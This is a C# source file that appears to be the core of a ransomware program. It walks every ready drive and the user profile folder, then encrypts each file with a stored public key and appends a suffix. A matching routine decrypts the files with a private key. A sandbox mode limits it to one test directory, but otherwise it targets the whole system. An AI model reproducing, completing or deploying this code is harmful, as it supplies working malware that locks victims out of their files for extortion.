using System;
using System.Collections.Generic;
using System.IO;

namespace Extension;

public class Queue
{
	public List<string> GetRecursiveFiles(bool toDecr)
	{
		List<string> list = new List<string>();
		if (Config.IsSandBox)
		{
			if (Directory.Exists(Config.SandBoxDirectory))
			{
				list.Add(Config.SandBoxDirectory);
			}
			else
			{
				Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + Config.SandBoxDirectory);
			}
		}
		else if (!Config.IsSandBox)
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.IsReady && driveInfo.RootDirectory.FullName != pathRoot)
				{
					list.Add(driveInfo.RootDirectory.FullName);
				}
			}
			list.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
		}
		List<string> list2 = new List<string>();
		foreach (string item in list)
		{
			foreach (string item2 in FileHandler.DirSearch(item, toDecr))
			{
				list2.Add(item2);
			}
		}
		return list2;
	}

	public void EncryptAllFiles()
	{
		string[] array = GetRecursiveFiles(toDecr: false).ToArray();
		try
		{
			if (!string.IsNullOrEmpty(Config.User.PublicKey))
			{
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (!text.Contains(Config.EncryptedFileSuffix))
					{
						Cryptor.EncryptFile(text, Config.User.PublicKey);
					}
				}
			}
			else
			{
				Console.WriteLine("\nAccount has not been saved yet.");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void DecryptAllFiles()
	{
		string[] array = GetRecursiveFiles(toDecr: true).ToArray();
		try
		{
			if (!string.IsNullOrEmpty(Config.User.PrivateKey))
			{
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Contains(Config.EncryptedFileSuffix) && !Cryptor.DecryptFile(text, Config.User.PrivateKey))
					{
						Console.WriteLine("file, " + text + ", couldn't be decrypted.");
					}
				}
			}
			else
			{
				Console.WriteLine("\nAccount has not been verified yet.");
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("\n\n-- Runtime Error --\nMessage: " + ex.Message + "\n" + ex.InnerException);
		}
	}
}
